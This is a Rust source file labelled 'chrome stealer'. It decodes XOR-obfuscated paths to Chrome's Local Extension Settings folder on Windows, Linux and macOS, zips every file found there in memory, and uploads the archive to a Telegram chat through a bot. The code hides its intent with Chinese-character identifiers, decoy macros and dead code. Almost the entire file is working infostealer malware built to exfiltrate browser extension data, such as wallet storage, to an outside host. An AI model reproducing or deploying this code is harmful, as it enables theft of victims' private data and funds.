//chrome stealer
use std::collections::HashMap;
use std::ffi::OsStr;
use std::fs::File;
use std::io::{self, Cursor, Seek, SeekFrom};
use std::os::unix::ffi::OsStrExt;
use std::path::PathBuf;
use teloxide::{prelude::*, types::InputFile};
use walkdir::WalkDir;
use zip::write::{FileOptions, ZipWriter};
use zip::CompressionMethod::Deflated;

macro_rules! pths {
    () => {{
        let _x = 42;
        let _y = _x * 2;
        std::hint::black_box(_y);
    }};
}

macro_rules! ub {
    ($bytes:expr) => {{
        const KEY: u8 = 0xAA;
        let deobfuscated: Vec<u8> = $bytes.iter().map(|&b| b ^ KEY).collect();
        String::from_utf8(deobfuscated).expect("")
    }};
}

fn 函數55() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let 變數_1: &[u8] = &[230, 229, 233, 235, 230, 235, 250, 250, 238, 235, 254, 235];
        let 變數_2 = ub!(變數_1);
        let 變數7 = std::env::var(變數_2).expect("");
        let 變數_3: &[u8] = &[
            237, 197, 197, 205, 198, 207, 133, 233, 194, 216, 197, 199, 207, 133, 255, 217, 207,
            216, 138, 238, 203, 222, 203, 133, 238, 207, 204, 203, 223, 198, 222, 133, 230, 197,
            201, 203, 198, 138, 239, 210, 222, 207, 196, 217, 195, 197, 196, 138, 249, 207, 222,
            222, 195, 196, 205, 217,
        ];
        let 變數_4 = ub!(變數_3);
        PathBuf::from(變數7).join(變數_4)
    }

    #[cfg(target_os = "linux")]
    {
        let 變數1: &[u8] = &[226, 229, 231, 239];
        let 變數2 = ub!(變數1);
        let 變數8 = std::env::var(變數2).expect("");
        let 變數3: &[u8] = &[
            132, 201, 197, 196, 204, 195, 205, 133, 205, 197, 197, 205, 198, 207, 135, 201, 194,
            216, 197, 199, 207, 133, 238, 207, 204, 203, 223, 198, 222, 133, 230, 197, 201, 203,
            198, 138, 239, 210, 222, 207, 196, 217, 195, 197, 196, 138, 249, 207, 222, 222, 195,
            196, 205, 217,
        ];
        let 變數4 = ub!(變數3);
        PathBuf::from(變數8).join(變數4)
    }

    #[cfg(target_os = "macos")]
    {
        let 變數1: &[u8] = &[255, 249, 239, 248, 249];
        let 變數2 = ub!(變數1);
        let 變數9 = std::env::var(變數2).expect("");
        let 變數3: &[u8] = &[
            230, 195, 200, 216, 203, 216, 211, 133, 235, 218, 218, 198, 195, 201, 203, 222, 195,
            197, 196, 138, 249, 223, 218, 218, 197, 216, 222, 133, 237, 197, 197, 205, 198, 207,
            133, 233, 194, 216, 197, 199, 207, 133, 238, 207, 204, 203, 223, 198, 222, 133, 230,
            197, 201, 203, 198, 138, 239, 210, 222, 207, 196, 217, 195, 197, 196, 138, 249, 207,
            222, 222, 195, 196, 205, 217,
        ];
        let 變數4 = ub!(變數3);
        PathBuf::from(變數9).join(變數4)
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        compile_error!("");
    }
}
pub fn 奧內德() -> io::Result<Cursor<Vec<u8>>> {
    let 帕斯基 = 函數55();

    if !帕斯基.exists() {
        eprintln!("");
    }
    let mut 瀏覽器路徑 = HashMap::new();
    瀏覽器路徑.insert("Chrome", 帕斯基);

    let mut 緩衝區 = Cursor::new(Vec::new());
    let 選項: FileOptions<()> = FileOptions::default().compression_method(Deflated);
    {
        let mut 拉鍊 = ZipWriter::new(&mut 緩衝區);

        for 入口 in &瀏覽器路徑 {
            for 文件條目 in WalkDir::new(&入口.1).into_iter().filter_map(|e| e.ok()) {
                let 小路 = 文件條目.path();
                if 小路.is_file() {
                    if let Ok(mut 文件) = File::open(&小路) {
                        if let Some(入口路徑) = 小路.strip_prefix(&入口.1).unwrap().to_str()
                        {
                            拉鍊.start_file(入口路徑, 選項).unwrap();
                            io::copy(&mut 文件, &mut 拉鍊).expect("");
                        }
                    } else {
                        eprintln!("");
                    }
                }
            }
        }

        拉鍊.finish().expect("");
    }

    緩衝區.seek(SeekFrom::Start(0))?;

    Ok(緩衝區)
}

pub async fn func11() -> Result<(), Box<dyn std::error::Error>> {
    if false {
        let _tgsx = 452;
    }
    let 知識庫: &[u8] = &[147, 147, 147, 147, 147, 147, 147, 147, 147, 147, 144, 203, 200, 201, 206, 207, 204, 205, 194, 195, 192, 193, 198, 199, 196, 197, 218, 219, 216, 217, 222, 223, 220, 221, 210, 211, 208, 235, 232, 233, 238, 239, 155, 152, 153, 158, 159];

    let 代幣 = ub!(知識庫);
    let 機器人 = Bot::new(代幣);
    let 聊天 = ChatId(-1009999999999);

    let 變數99 = 奧內德()?;
    let 變數91 = 變數99.get_ref().clone();

    let 變數85 = InputFile::memory(變數91).file_name("文件.zip");
    機器人.send_document(聊天, 變數85).await?;

    Ok(())
}
